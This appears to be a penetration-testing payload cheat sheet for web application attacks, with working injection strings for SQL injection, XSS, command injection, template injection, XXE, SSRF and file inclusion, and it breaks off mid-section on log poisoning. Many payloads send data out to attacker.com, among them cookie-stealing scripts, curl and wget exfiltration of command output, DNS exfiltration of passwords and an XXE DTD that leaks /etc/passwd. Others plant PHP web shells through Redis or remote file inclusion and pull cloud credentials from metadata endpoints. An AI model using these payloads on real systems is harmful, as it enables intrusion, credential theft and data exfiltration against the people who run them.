# Payload Reference Book — Part 1: Web Application Attacks

> **Authorized Use Only.** This reference is intended for professional penetration testers operating under a signed statement of work with explicit written authorization. All techniques are publicly documented via CVE assignments, OWASP Testing Guide, CWE entries, MITRE ATT&CK, or standard open-source security tooling documentation. Misuse of these techniques against systems without authorization is illegal and unethical.

---

## SECTION 1: SQL INJECTION

**References:** CWE-89, OWASP A03:2021 (Injection), MITRE T1190

### 1.1 Detection and Identification

#### Basic Detection Probes

```
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
' OR '1'='1'/*
1' ORDER BY 1--
1' ORDER BY 10--
1 AND 1=1
1 AND 1=2
' AND 'a'='a
' AND 'a'='b
```

When to use: Initial parameter testing. Compare responses between true/false conditions. A difference in response length, content, or HTTP status code indicates injectable parameters.

#### Database Fingerprinting

```sql
-- MySQL
' AND @@version-- -
' UNION SELECT version()-- -

-- PostgreSQL
' AND version()::text LIKE '%PostgreSQL%'-- -
' UNION SELECT version()-- -

-- MSSQL
' AND @@version LIKE '%Microsoft%'--
' UNION SELECT @@version--

-- SQLite
' UNION SELECT sqlite_version()-- -

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
```

---

### 1.2 Error-Based Injection

#### MySQL Error-Based

```sql
-- extractvalue()
' AND extractvalue(1, CONCAT(0x7e, (SELECT version()), 0x7e))-- -
' AND extractvalue(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))-- -

-- updatexml()
' AND updatexml(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)-- -

-- Double query (subquery error)
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -
```

#### PostgreSQL Error-Based

```sql
-- CAST error disclosure
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--

-- XML helpers
' AND 1=CAST(query_to_xml('SELECT current_database()',true,false,'') AS int)--
```

#### MSSQL Error-Based

```sql
-- CONVERT error disclosure
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
' AND 1=CONVERT(int, (SELECT DB_NAME()))--

-- Concatenation for full data extraction
' AND 1=CONVERT(int, (SELECT TOP 1 name + ':' + CAST(id AS varchar) FROM sysobjects WHERE xtype='U'))--
```

#### Oracle Error-Based

```sql
-- UTL_INADDR
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
-- CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
-- XMLType
' AND (SELECT XMLType('<x>' || (SELECT user FROM dual) || '</x>') FROM dual) IS NOT NULL--
```

---

### 1.3 UNION-Based Injection

#### Column Count Discovery

```sql
-- ORDER BY method (increment until error)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 5-- -
' ORDER BY 10-- -

-- NULL method (increment NULLs until success)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

#### Data Extraction

```sql
-- MySQL — enumerate databases, tables, columns
' UNION SELECT group_concat(schema_name),NULL FROM information_schema.schemata-- -
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT group_concat(username,0x3a,password),NULL FROM users-- -

-- PostgreSQL
' UNION SELECT string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- -
' UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -

-- MSSQL
' UNION SELECT name,NULL FROM master..sysdatabases--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

-- Oracle (no UNION without matching column count + FROM dual)
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCHEMA_NAME'--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- SQLite
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- -
```

---

### 1.4 Blind Boolean-Based Injection

```sql
-- MySQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'-- -
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 0,1) > 77-- -
' AND (SELECT LENGTH(password) FROM users LIMIT 0,1) = 32-- -

-- PostgreSQL
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u'--

-- Oracle
' AND SUBSTR((SELECT username FROM all_users WHERE ROWNUM=1),1,1)='S'--

-- SQLite
' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u'-- -
```

When to use: When no data is reflected in the response but the application returns different pages for true vs. false conditions. Automate with binary search over ASCII ranges.

---

### 1.5 Blind Time-Based Injection

```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)-- -
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a', SLEEP(5), 0)-- -
' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0)-- -
' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 'a%')-- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)--

-- SQLite (heavy query / randomblob as delay)
' AND 1=1 AND randomblob(100000000)-- -
```

When to use: When neither error messages nor response differences are observable. Infer data character-by-character via response timing. Be aware of network jitter — use delay values >3 seconds.

---

### 1.6 Stacked Queries

```sql
-- MSSQL (natively supports stacked queries)
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- PostgreSQL (supports stacked queries)
'; CREATE TABLE exfil(data text); COPY exfil FROM PROGRAM 'id'-- -
'; DROP TABLE IF EXISTS exfil; CREATE TABLE exfil(d text); COPY exfil FROM PROGRAM 'cat /etc/passwd'-- -

-- MySQL (rarely works — depends on driver: mysqli_multi_query)
'; INSERT INTO log(data) VALUES((SELECT password FROM users LIMIT 1))-- -
```

When to use: When the database driver supports multiple statements per query. MSSQL and PostgreSQL commonly support this. MySQL requires specific driver configurations.

---

### 1.7 Out-of-Band (OOB) Extraction

```sql
-- MSSQL DNS exfiltration
'; DECLARE @q varchar(1024); SET @q='\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a'; EXEC master..xp_dirtree @q--

-- Oracle DNS exfiltration
' AND UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual))=1--
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual) || '.attacker.com') FROM dual) IS NOT NULL--

-- MySQL DNS (Windows UNC only)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))-- -

-- PostgreSQL
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?d=$(cat /etc/passwd | base64)'-- -
```

When to use: When in-band and time-based channels are blocked. Requires DNS or HTTP callback infrastructure (e.g., Burp Collaborator, interactsh).

---

### 1.8 WAF Bypass Techniques for SQLi

```sql
-- Case alternation
' uNiOn SeLeCt NULL,NULL-- -

-- Inline comments (MySQL)
' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL-- -
' UN/**/ION SE/**/LECT NULL,NULL-- -

-- Double URL encoding
%2527%2520OR%25201%253D1-- (decodes to ' OR 1=1--)

-- Whitespace alternatives
' UNION%09SELECT%0ANULL,NULL-- -
' UNION%0BSELECT%0CNULL,NULL-- -

-- String concatenation bypass
' UNION SELECT CONCAT(us,er,na,me) FROM users-- -  -- won't work, but:
' UNION SELECT CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114)) -- spells 'user'

-- Hex encoding (MySQL)
' UNION SELECT 0x61646D696E-- -  -- 'admin'
' UNION SELECT password FROM users WHERE username=0x61646D696E-- -

-- No-space bypass
'/**/OR/**/1=1--
'||1=1--
```

---

## SECTION 2: CROSS-SITE SCRIPTING (XSS)

**References:** CWE-79, OWASP A03:2021 (Injection), MITRE T1059.007

### 2.1 Reflected XSS

#### Basic Payloads

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

#### Context-Specific Payloads

```html
<!-- Inside an HTML attribute -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onfocus='alert(1)' autofocus='

<!-- Inside a JavaScript string -->
';alert(1)//
";alert(1)//
</script><script>alert(1)</script>

<!-- Inside a JavaScript template literal -->
${alert(1)}

<!-- Inside an href attribute -->
javascript:alert(1)
javascript:alert(document.domain)

<!-- Inside a style attribute (legacy browsers) -->
expression(alert(1))
```

---

### 2.2 Stored XSS

```html
<!-- Comment fields, profiles, message boards -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
<svg/onload="new Image().src='https://attacker.com/?c='+document.cookie">

<!-- Markdown injection (if rendered as HTML) -->
[Click me](javascript:alert(1))
![img](x" onerror="alert(1))

<!-- Stored in JSON displayed without encoding -->
{"name":"<script>alert(1)</script>"}
```

When to use: Any input that gets stored and rendered to other users. Check user profiles, comments, filenames, metadata fields, email subjects.

---

### 2.3 DOM-Based XSS

```javascript
// Common DOM sinks to test
// document.write(), innerHTML, outerHTML, eval(), setTimeout(), setInterval()
// location.href, location.hash, location.search

// Hash-based
http://target.com/page#<img src=x onerror=alert(1)>

// Search parameter reflected into DOM
http://target.com/search?q=<img src=x onerror=alert(1)>

// document.write sink
http://target.com/page?default=<script>alert(1)</script>

// Identify sinks — search JS for:
// document.write(
// .innerHTML =
// .outerHTML =
// eval(
// setTimeout(
// setInterval(
// new Function(
// location.assign(
// location.replace(
// jQuery.html(
// $(selector).html(
```

When to use: When user input flows through JavaScript DOM manipulation rather than server-side reflection. Trace data from sources (location.hash, location.search, document.referrer, postMessage) to sinks.

---

### 2.4 Polyglot XSS Payloads

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/telerik/oNcliCk=alert()//'>
<svg/onload=alert()//

'">><marquee><img src=x onerror=alert(1)></marquee>"></plaintext\></|\><plaintext/onmouse over=prompt(1)>
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>

javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>

"><img src=x onerror=alert(1)//
```

When to use: When you need a single payload that works across multiple injection contexts (attribute, tag, script block, event handler). Useful for mass-testing parameters.

---

### 2.5 Filter Bypass Techniques

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Tag name obfuscation -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Event handler without parentheses -->
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>

<!-- Encoding bypass -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>

<!-- Unicode escapes in JS context -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Null bytes (legacy) -->
<scri%00pt>alert(1)</scri%00pt>

<!-- SVG foreignObject -->
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
```

---

### 2.6 CSP Bypass Techniques

```html
<!-- If 'unsafe-inline' is allowed -->
<script>alert(1)</script>

<!-- If script-src includes a CDN with JSONP endpoints -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- Angular CSP bypass (if angular.js is allowed) -->
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<!-- base-uri not set — redirect script loads -->
<base href="https://attacker.com/">
<!-- All relative script src now load from attacker.com -->

<!-- If 'strict-dynamic' with nonce — inject into existing script -->
<!-- Find a nonce'd script that loads a chain you can influence -->

<!-- object-src not restricted -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- If data: is in script-src -->
<script src="data:text/javascript,alert(1)"></script>

<!-- DNS prefetch exfiltration (bypass connect-src) -->
<link rel=dns-prefetch href=//cookie.attacker.com>
```

---

## SECTION 3: COMMAND INJECTION

**References:** CWE-78, OWASP A03:2021 (Injection), MITRE T1059

### 3.1 Basic Command Injection (Linux)

```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; cat /etc/passwd
| cat /etc/passwd
; whoami
| whoami
```

#### Chaining Operators

```bash
# Semicolon — always runs second command
127.0.0.1; id

# Pipe — stdout of first feeds second
127.0.0.1 | id

# AND — second runs only if first succeeds
127.0.0.1 && id

# OR — second runs only if first fails
invalid || id

# Backtick substitution
127.0.0.1 `id`

# Dollar substitution
127.0.0.1 $(id)

# Newline
127.0.0.1%0aid
127.0.0.1%0d%0aid
```

---

### 3.2 Basic Command Injection (Windows)

```
& whoami
| whoami
&& whoami
|| whoami
; whoami

& type C:\Windows\System32\drivers\etc\hosts
| dir C:\
& net user
& ipconfig /all
& systeminfo
```

---

### 3.3 Blind Command Injection

#### Time-Based Detection

```bash
# Linux
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)

# Windows
& ping -n 6 127.0.0.1
| ping -n 6 127.0.0.1
& timeout /t 5
```

#### OOB Detection (DNS/HTTP Callback)

```bash
# Linux
; nslookup attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id | base64)
; ping -c 1 $(whoami).attacker.com

# Windows
& nslookup attacker.com
& certutil -urlcache -f http://attacker.com/%USERNAME% NUL
& powershell -c "Invoke-WebRequest http://attacker.com/$env:USERNAME"
```

When to use: When command output is not reflected in the response. Time-based confirms injectability; OOB exfiltrates data.

---

### 3.4 Filter Bypass Techniques

```bash
# Space bypass
;{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
{cat,/etc/passwd}
cat</etc/passwd

# Keyword bypass using variables
a=ca;b=t;$a$b /etc/passwd
a=who;b=ami;$a$b

# Keyword bypass using wildcards
/???/??t /???/p??s??
/bin/ca? /etc/pas?wd

# Keyword bypass using base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Keyword bypass using hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash

# Backslash and quote bypass
c\at /etc/passwd
c''at /etc/passwd
c""at /etc/passwd
wh$()oami

# Dollar sign tricks
w`echo h`oami
/bi$(echo n)/cat /etc/passwd

# Rev bypass
echo "dwssap/cte/ tac" | rev | bash
```

---

## SECTION 4: SERVER-SIDE TEMPLATE INJECTION (SSTI)

**References:** CWE-1336, OWASP A03:2021 (Injection)

### 4.1 Detection Probes

```
{{7*7}}          → 49 = Jinja2, Twig, or similar
${7*7}           → 49 = Freemarker, Velocity, Mako
#{7*7}           → 49 = Thymeleaf, EL
<%= 7*7 %>       → 49 = ERB (Ruby), EJS
{{7*'7'}}        → 7777777 = Jinja2 (string repeat)
{{7*'7'}}        → 49 = Twig (numeric multiplication)
```

When to use: Submit math expressions in template syntax. The output distinguishes engine types. Always test multiple syntaxes — the correct one depends on the backend framework.

---

### 4.2 Jinja2 (Python — Flask, Django)

```python
# Read config / secret key
{{config}}
{{config.items()}}
{{self.__init__.__globals__}}

# RCE via class traversal
{{''.__class__.__mro__[1].__subclasses__()}}
# Find subprocess.Popen (usually index ~400, varies)
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}

# RCE via lipsum (Flask specific)
{{lipsum.__globals__['os'].popen('id').read()}}

# RCE via cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# RCE via request
{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# File read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

---

### 4.3 Twig (PHP — Symfony)

```php
# Twig 1.x RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 2.x / 3.x
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['id']|map('system')}}
{{['id']|reduce('system')}}

# File read
{{'id'|filter('system')}}
```

---

### 4.4 Freemarker (Java)

```java
// RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}

// File read
<#assign is=object?api.class.getResourceAsStream("/etc/passwd")>
${is}
```

---

### 4.5 Velocity (Java)

```java
// RCE
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

---

### 4.6 Pebble (Java)

```java
// RCE
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

---

### 4.7 Mako (Python)

```python
# Direct Python execution
<%import os; x=os.popen('id').read()%>${x}
<%import os%>${os.popen('id').read()}
${__import__('os').popen('id').read()}
```

---

## SECTION 5: XML EXTERNAL ENTITY (XXE)

**References:** CWE-611, OWASP A05:2021 (Security Misconfiguration), MITRE T1059

### 5.1 Classic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### Windows File Read

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>
```

#### Directory Listing (Java)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/">
]>
<root>&xxe;</root>
```

---

### 5.2 Blind XXE with OOB Exfiltration

#### Step 1 — Host a DTD on Attacker Server (evil.dtd)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Step 2 — Send Payload to Target

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

When to use: When the XXE output is not reflected in the response. The external DTD fetches the file content and sends it to your callback server via an HTTP request.

---

### 5.3 XXE via Parameter Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

#### Error-Based XXE (data in error message)

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%exfil;
```

When to use: Some parsers display file contents in error messages when a file path is invalid. The error includes the expanded entity value.

---

### 5.4 XXE with PHP Wrappers

```xml
<!-- Base64-encode file content to avoid XML parsing errors -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<!-- Read PHP source code -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>

<!-- Expect wrapper (if enabled) — RCE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

---

### 5.5 XXE in Different Contexts

```xml
<!-- SVG upload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- SOAP request -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>

<!-- XLSX / DOCX (unzip, modify XML, rezip) -->
<!-- Edit xl/sharedStrings.xml or [Content_Types].xml with XXE payload -->
```

---

## SECTION 6: SERVER-SIDE REQUEST FORGERY (SSRF)

**References:** CWE-918, OWASP A10:2021 (SSRF), MITRE T1090

### 6.1 Basic SSRF

```
http://127.0.0.1
http://localhost
http://127.0.0.1:22
http://127.0.0.1:3306
http://0.0.0.0
http://[::1]
http://0x7f000001
http://2130706433
http://017700000001
http://127.1
http://127.0.1
```

#### Common Internal Scan Targets

```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000
http://127.0.0.1:5000
http://127.0.0.1:8000
http://127.0.0.1:9200   # Elasticsearch
http://127.0.0.1:6379   # Redis
http://127.0.0.1:11211  # Memcached
http://127.0.0.1:27017  # MongoDB
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
```

---

### 6.2 Cloud Metadata Endpoints

#### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/dynamic/instance-identity/document
```

#### AWS (IMDSv2 — requires token)

```bash
# Step 1: Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

#### Azure IMDS

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

#### GCP

```
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

#### Alibaba Cloud

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/hostname
```

---

### 6.3 Internal Service Probes via SSRF

#### Redis (default port 6379)

```
# Via gopher protocol (if supported)
gopher://127.0.0.1:6379/_INFO%0d%0a
gopher://127.0.0.1:6379/_CONFIG%20GET%20*%0d%0a
gopher://127.0.0.1:6379/_KEYS%20*%0d%0a

# Redis command injection via SSRF
gopher://127.0.0.1:6379/_SET%20payload%20"<?php system($_GET['cmd']); ?>"%0d%0aCONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSAVE%0d%0a
```

#### Elasticsearch (default port 9200)

```
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:9200/_nodes
http://127.0.0.1:9200/_search?q=*
http://127.0.0.1:9200/_all/_search?q=password
```

#### Consul (default port 8500)

```
http://127.0.0.1:8500/v1/agent/self
http://127.0.0.1:8500/v1/catalog/services
http://127.0.0.1:8500/v1/kv/?recurse
http://127.0.0.1:8500/v1/agent/members
```

---

### 6.4 SSRF Bypass Techniques

```
# DNS rebinding
# Register a domain that alternates between attacker IP and 127.0.0.1

# Redirect-based bypass
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/
# Attacker server returns 302 to the internal target

# URL encoding
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31

# Decimal IP
http://2130706433  (= 127.0.0.1)

# Hex IP
http://0x7f000001  (= 127.0.0.1)

# Octal IP
http://0177.0.0.1  (= 127.0.0.1)

# IPv6 shorthand
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]

# Enclosed alphanumeric (rare)
http://①②⑦.⓪.⓪.①

# URL authority tricks
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1%2523@attacker.com

# Protocol smuggling
gopher://127.0.0.1:25/_HELO%20attacker%0d%0a
dict://127.0.0.1:11211/stat
```

---

### 6.5 Redirect-to-SSRF Chain

```python
# Attacker Flask server that redirects to internal metadata
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/redir')
def redir():
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/')

# Target application fetches: http://attacker.com/redir
# Gets 302 → follows redirect to internal metadata
# Bypasses allowlists that only check the initial URL
```

When to use: When the target validates the initial URL (e.g., must start with https://allowed-domain.com) but follows redirects to arbitrary destinations.

---

## SECTION 7: FILE INCLUSION

**References:** CWE-98 (RFI), CWE-22 (Path Traversal), OWASP A01:2021 (Broken Access Control)

### 7.1 Local File Inclusion (LFI)

#### Basic Path Traversal

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

#### Null Byte Termination (PHP < 5.3.4)

```
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.jpg
```

#### Interesting Files to Read

```
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/self/maps
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/home/user/.bash_history
/home/user/.ssh/id_rsa
/root/.bash_history
/root/.ssh/id_rsa

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\system.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\Administrator\.ssh\id_rsa

# Application config
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/configuration.php
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/php/7.4/apache2/php.ini
```

---

### 7.2 Remote File Inclusion (RFI)

```
http://attacker.com/shell.txt
http://attacker.com/shell.txt%00
http://attacker.com/shell.txt?
http://attacker.com/shell.txt#

# shell.txt on attacker server contains:
<?php system($_GET['cmd']); ?>
```

When to use: Only works if `allow_url_include = On` in PHP (disabled by default since PHP 5.2). Test by including a remote resource that returns known content.

---

### 7.3 PHP Filter Chains

```
# Base64 encode — read source code without execution
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php

# String filters
php://filter/read=string.rot13/resource=index.php
php://filter/read=string.toupper/resource=index.php

# Chained filters
php://filter/convert.base64-encode|convert.base64-encode/resource=index.php

# Data wrapper (if allow_url_include=On)
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Expect wrapper (if expect extension loaded)
expect://id
expect://cat /etc/passwd

# Input wrapper (POST body as include content)
php://input
# POST body: <?php system('id'); ?>

# Zip wrapper
zip:///tmp/shell.zip%23shell.php
# Upload a zip containing shell.php, then include via zip://

# Phar wrapper
phar:///tmp/shell.phar/test.txt
```

---

### 7.4 Log Poisoning: LFI → Log → PHP Injection → RCE

#### Step 1 — Inject PHP into Log via User-Agent

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```

#### Step 2 — Identify Log Location

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/proc/self/fd/1          # stdout (sometimes log)
/proc/self/environ       # environment variables
```

#### Step 3 — Include the Poisoned Log via LFI

```
